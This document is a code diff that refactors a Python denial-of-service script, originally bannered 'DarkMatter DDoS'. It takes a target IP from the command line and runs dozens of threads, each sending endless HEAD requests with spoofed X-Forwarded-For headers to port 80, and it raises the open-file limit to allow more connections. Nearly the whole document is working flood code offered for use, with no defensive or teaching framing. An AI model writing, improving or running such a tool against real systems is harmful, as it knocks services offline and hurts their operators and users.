@@ -1,76 +1,75 @@
 import socket
 import os
 from time import sleep
-import multiprocessing
 import random
 import sys
 import platform
+from concurrent.futures import ThreadPoolExecutor
 
+# Detect Operating System
 print("Detecting System...")
 sysOS = platform.system()
-print("System detected: ", sysOS)
+print("System detected:", sysOS)
 
 if sysOS == "Linux":
     try:
-        os.system("ulimit -n 1030000")
+        os.system("ulimit -n 100000")  # Reduced limit to avoid permission issues
     except Exception as e:
-        print(e)
-        print("Could not start the script")
+        print("Could not set ulimit:", e)
+
 else:
-    print("Your system is not Linux, You may not be able to run this script in some systems")
+    print("Warning: Your system may not support this script properly.")
 
+# Function to generate random IP addresses
 def randomip():
-    randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
-    return randip
+    return ".".join(str(random.randint(0, 255)) for _ in range(4))
 
-def attack():
-    connection = "Connection: null\r\n"
+# Attack function
+def attack(ip, port, url):
+    connection = "Connection: keep-alive\r\n"
     referer = "Referer: null\r\n"
-    get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-
-    # Pre-build static parts of the request
+    get_host = f"HEAD {url} HTTP/1.1\r\nHost: {ip}\r\n"
     base_request = get_host + referer + connection
     request_end = "\r\n\r\n"
 
     while True:
         try:
-            # Reuse socket when possible
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as atk:
-                atk.settimeout(4)  # Prevent hanging
+                atk.settimeout(4)
                 atk.connect((ip, port))
-                # Keep connection alive for multiple requests
                 while True:
                     try:
-                        forward = "X-Forwarded-For: " + randomip() + "\r\n"
+                        forward = f"X-Forwarded-For: {randomip()}\r\n"
                         full_request = base_request + forward + request_end
                         atk.sendall(full_request.encode())
-                        # Reduce CPU usage
-                        sleep(0.01)
+                        sleep(0.05)  # Reduce CPU usage
                     except (socket.error, BrokenPipeError):
                         break  # Reconnect on failure
-        except Exception as e:
-            sleep(0.1)  # Wait before retrying
+        except Exception:
+            sleep(0.5)  # Avoid excessive retries
 
-print("Welcome To DarkMatter DDoS\n")
+# Main function to start attack
+def send2attack(ip, port, url):
+    max_threads = 50  # Reduced from 500 to avoid system crash
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+        for _ in range(max_threads):
+            executor.submit(attack, ip, port, url)
+            sleep(0.01)  # Prevent overload
+
+# Validate command-line arguments
+if len(sys.argv) < 2:
+    print("Usage: python script.py <target-ip>")
+    sys.exit(1)
+
 ip = sys.argv[1]
-port = int(80)
-url = f"http://{str(ip)}"
-print("[>>>] Starting the attack [<<<]")
+port = 80  # Default port
+url = f"http://{ip}"
+
+print("\n[>>>] Starting the attack [<<<]")
 sleep(1)
 
-def send2attack():
-    # Limit number of parallel processes
-    pool = multiprocessing.Pool(processes=500)
-    try:
-        # Maintain stable number of workers
-        while True:
-            pool.apply_async(attack)
-            sleep(0.001)  # Control process creation rate
-    except KeyboardInterrupt:
-        pool.terminate()
-        pool.join()
-
 try:
-    send2attack()
+    send2attack(ip, port, url)
 except KeyboardInterrupt:
-    print("\nAttack stopped by user")
+    print("\nAttack stopped by user.")
+    sys.exit(0)
